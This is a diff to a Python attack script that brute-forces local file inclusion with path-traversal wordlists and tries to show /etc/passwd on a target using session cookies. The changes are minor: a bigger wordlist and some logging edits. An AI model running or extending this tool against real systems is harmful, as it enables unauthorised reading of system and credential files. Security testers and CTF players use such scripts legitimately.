@@ -3,7 +3,7 @@
 import requests
 import urllib.parse
 
-TRAVERSAL_WORDLIST = "wordlists/traversal_small.txt"  # wordlists/traversal_small.txt OR wordlists/traversal_big.txt
+TRAVERSAL_WORDLIST = "wordlists/traversal_big.txt"  # wordlists/traversal_small.txt OR wordlists/traversal_big.txt
 
 def show_passwd(target_url, COOKIE):
     print("Attempting to show /etc/passwd...")
@@ -52,7 +52,7 @@ def brute_force_lfi(
                 test_url = (
                     f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
                 )
-                print(f"[*] Trying LFI URL: {test_url}")
+                # print(f"[*] Trying LFI URL: {test_url}")
 
                 try:
                     response = session.get(test_url, cookies=COOKIE)
@@ -61,6 +61,7 @@ def brute_force_lfi(
 
                     # Failure indicator check
                     if failure_indicator and failure_indicator in response.text:
+                        print(f"[-] Failed to include payload: {test_url}")
                         continue  # Skip this attempt
 
                     # Success indicator check
